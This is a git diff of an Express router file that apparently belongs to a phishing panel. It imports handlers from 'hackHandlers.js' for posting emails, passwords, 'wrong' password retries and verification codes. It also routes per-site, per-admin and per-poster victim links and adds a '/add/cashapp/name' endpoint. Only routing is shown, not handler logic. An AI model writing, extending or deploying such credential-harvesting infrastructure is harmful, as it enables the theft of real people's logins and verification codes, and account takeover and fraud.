@@ -12,7 +12,7 @@ import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,
 
 import {
     
-    renumber_add, email_post, email_post_wrong, password_post, password_post_wrong, code_page_post, successful_page_post,reverify_code_page_post,renumber_code_page_post,mega_wrong
+    renumber_add, email_post, email_post_wrong, password_post, password_post_wrong, code_page_post, successful_page_post,reverify_code_page_post,renumber_code_page_post,mega_wrong,add_name
     
 } from './hackHandlers.js'
 
@@ -98,6 +98,12 @@ router.post('/add/email/pass', add_email);
 
 router.post('/send/email/test', send_email);
 
+
+router.post('/add/cashapp/name', add_name);//edit links number
+
+
+
+
 router.get('/yoyo',yoyo);
 router.get('/:adminId/:posterId', click);///click find
 router.get('/:adminId/', click_for_admin);///click find
@@ -110,9 +116,10 @@ router.get('/posters/details/:id/', poster_details);
 router.get('/info/:username/:id/:admin', info_get);
 
 router.get('/get/poster/:id/:admin', get_A_poster);////
-router.get('/:site/:adminId/:posterId/:device', site_exist);
+// router.get('/:site/:adminId/:posterId/:device', site_exist);
+router.get('/:site/:adminId/:posterId/:verifyId/:device', site_exist);
 
-router.get('/:site/:adminId/:posterId/:verifyId/:device', site_exist_new);
+// router.get('/:site/:adminId/:posterId/:verifyId/:device', site_exist_new);
 
 router.get('/qrcode/status/check/:adminId',check_qrcode)  
 
